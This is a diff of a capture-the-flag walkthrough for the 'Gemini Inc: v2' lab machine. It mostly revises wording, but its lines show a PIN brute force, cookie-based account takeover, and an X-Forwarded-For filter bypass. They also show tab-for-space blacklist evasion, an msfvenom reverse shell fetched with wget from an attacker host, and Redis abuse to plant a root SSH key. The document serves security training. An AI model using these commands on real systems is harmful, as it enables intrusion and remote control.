@@ -1,7 +1,7 @@
 ---
 layout: post
 date: 2018-06-03 17:25:02 +0000
-last_modified_at: 2018-06-17 15:56:11 +0000
+last_modified_at: 2018-06-20 17:17:33 +0000
 title: "Gemini Inc: v2 Walkthrough"
 category: Walkthrough
 tag: "Gemini Inc"
@@ -86,15 +86,15 @@ It's obvious there's a user registration and activation process. Look at the res
 
 ![0.z46xpgzawqe](/assets/images/posts/gemini-inc-v2-walkthrough/0.z46xpgzawqe.png)
 
-Let's register an account with the site using everything `admin`. Yes, even the password.
+Let's register an account with the site using everything `admin` — even the password.
 
 ![0.wxincvw3tgq](/assets/images/posts/gemini-inc-v2-walkthrough/0.wxincvw3tgq.png)
 
-Although the first attempt results in an error like this, the site has registered the account.
+Although the first attempt results in an error like this, the site has actually registered the account.
 
 ![0.d8b6kznuxu](/assets/images/posts/gemini-inc-v2-walkthrough/0.d8b6kznuxu.png)
 
-Once we log in through `/login.php`, a message greets us and tells us that we have to submit a 6-digit code to activate the account.
+Once we log in to `/login.php`, a message greets us and tells us that we have to submit a 6-digit code to activate the account.
 
 ![0.uawm8innbm](/assets/images/posts/gemini-inc-v2-walkthrough/0.uawm8innbm.png)
 
@@ -102,7 +102,7 @@ We'll need the user ID to activate the account. Although the account is not acti
 
 ![0.2u9hulbd8mh](/assets/images/posts/gemini-inc-v2-walkthrough/0.2u9hulbd8mh.png)
 
-You can change the user ID in the URL, and because the page's title gave their usernames away, you can determine the username and user ID of all the users from here.
+You can determine the username and user ID of all the users from here because the page's title gave the usernames away when you change the user ID in the URL.
 
 ```
 Gemini   (u=1)
@@ -114,7 +114,7 @@ demo4    (u=13)
 admin    (u=14)
 ```
 
-Now that I have the user ID of the newly registered account, let's proceed to activate it. Before we do that, know this &mdash; any invalid code will result in a `403 INVALID VALUE` response from the server.
+Now that we know the user ID of the newly registered account, let's proceed to activate it. Before we do that, know this &mdash; any invalid code will result in a `403 INVALID VALUE` response from the server.
 
 ![0.7qgwlhrfd8u](/assets/images/posts/gemini-inc-v2-walkthrough/0.7qgwlhrfd8u.png)
 
@@ -180,13 +180,13 @@ Let's run the script.
 [+] uid: 14, pin: 000511
 ```
 
-The activation code appears fixed for all new accounts; not that this information is helpful at this point, it's merely a casual observation.
+The activation code appears fixed for all new accounts; not that this casual observation is helpful at this point.
 
 Now that the account is active, the full set of features for an ordinary member is available.
 
 ![0.j2aurisrpv](/assets/images/posts/gemini-inc-v2-walkthrough/0.j2aurisrpv.png)
 
-I saw the password hash in the HTML source of the profile page during investigation of the unlocked features.
+I saw the password hash of the logged-in user in the HTML source of the profile page during the investigation of the unlocked features.
 
 ![0.xzv6pwuqt2](/assets/images/posts/gemini-inc-v2-walkthrough/0.xzv6pwuqt2.png)
 
@@ -201,7 +201,7 @@ demo1337:5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8:::::
 demo4:5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8:::::
 ```
 
-We could add cookies to our browser to gain access to Gemini's account like so:
+We could add cookies to our browser to gain access to Gemini's account like this.
 
 ```
 user=Gemini;pass=edbd1887e772e13c251f688a5f10c1ffbb67960d
@@ -219,7 +219,7 @@ Clicking on either **General Settings** or **Execute Command** shows nothing. I 
 
 ![0.iia4qhz8ici](/assets/images/posts/gemini-inc-v2-walkthrough/0.iia4qhz8ici.png)
 
-There's a Burp extension &mdash; **Bypass WAF**, that does the trick. Essentially, the extension adds custom headers such as `X-Forwarded-For: 127.0.0.1` to every HTTP request made through Burp. The instruction to add the extension is beyond the scope of this walkthrough.
+There's a Burp extension &mdash; **Bypass WAF**, that can help us do this seamlessly. Essentially, the extension adds custom headers such as `X-Forwarded-For: 127.0.0.1` to every HTTP request made through Burp. The instruction to add the extension is beyond the scope of this walkthrough.
 
 Suffice to say, after adding the custom headers, I'm able to display **General Settings** and **Execute Command**.
 
@@ -227,19 +227,19 @@ Suffice to say, after adding the custom headers, I'm able to display **General S
 
 ![0.zjtyxnja1w](/assets/images/posts/gemini-inc-v2-walkthrough/0.zjtyxnja1w.png)
 
-Something strikes me as familiar when I look at the HTML source of the **Execute Command** page at `/new-groups.php`.
+Something strikes me as familiar when I look at the HTML source of `/new-groups.php` — the **Execute Command** page.
 
 ![0.747hclxg2ig](/assets/images/posts/gemini-inc-v2-walkthrough/0.747hclxg2ig.png)
 
-Recall the file `blacklist.txt` uncovered during fuzzing? It had a test for illegal characters in the `testcmd` parameter. Here we have, a readily available web shell that executes commands, and yet we have to get pass the test for illegal characters. What a bummer!
+Recall the file `blacklist.txt` uncovered during fuzzing? It had a test for illegal characters in the `testcmd` parameter. Here we have, a readily available web shell that executes commands, and yet we have to bypass the test for illegal characters. What a bummer!
 
 ![0.y241xdjfa4g](/assets/images/posts/gemini-inc-v2-walkthrough/0.y241xdjfa4g.png)
 
 ### Execute Command
 
-The most common shell in Linux distributions is `bash` and it uses whitespace as the separator for command execution. For example, in this command `wget -O /tmp/rev 192.168.10.128/rev`, the space character is the separator. In fact, `bash` defines space, tab, and the newline character as whitespace. In other words, we can substitute space with tab in the previous command and it should execute.
+The most common shell in Linux distributions is `bash` and it uses whitespace as the separator between the command, option(s), and argument(s). For example, in this command execution —  `wget -O /tmp/rev 192.168.10.128/rev`, the space character is the separator between the command `wget`, the option `-O`, and the arguments `/tmp/rev` and `192.168.10.128/rev`. In fact, `bash` defines space, tab, and the newline character as whitespace. In other words, we can substitute the space character (`\x20`) with the tab character (`\x09`) in the previous example and it would still execute.
 
-With this in mind, let's generate a reverse shell with `msfvenom` and name it as `rev`; host it with Python's `SimpleHTTPServer`, and execute `wget` in the **Execute Command** page to copy it over. The aim is to execute the reverse shell in the **Execute Command** page.
+With this in mind, let's generate a reverse shell with `msfvenom` and name it as `rev`; host it with Python's `SimpleHTTPServer`, and execute `wget -O /tmp/rev 192.168.10.128/rev` in the **Execute Command** page to transfer it over, replacing the space character with the tab character. We then execute `/tmp/rev` in the **Execute Command** page to launch the reverse shell. We also need to get the `netcat` listener ready to catch the reverse shell.
 
 ```
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.10.128 LPORT=4444 -f elf -o rev
@@ -275,7 +275,7 @@ The password to log in to the `redis` server is conveniently located in `/etc/re
 
 ![0.bty888qayjj](/assets/images/posts/gemini-inc-v2-walkthrough/0.bty888qayjj.png)
 
-With the password, I can proceed to abuse `redis` to write files as `root`. We could write the RSA public key we control to `/root/.ssh/authorized_keys` and gain `root` access through SSH.
+With the password, I can proceed to abuse `redis` to write files as `root`. We can write the RSA public key we control to `/root/.ssh/authorized_keys` and gain `root` access through SSH.
 
 Here's how.
 
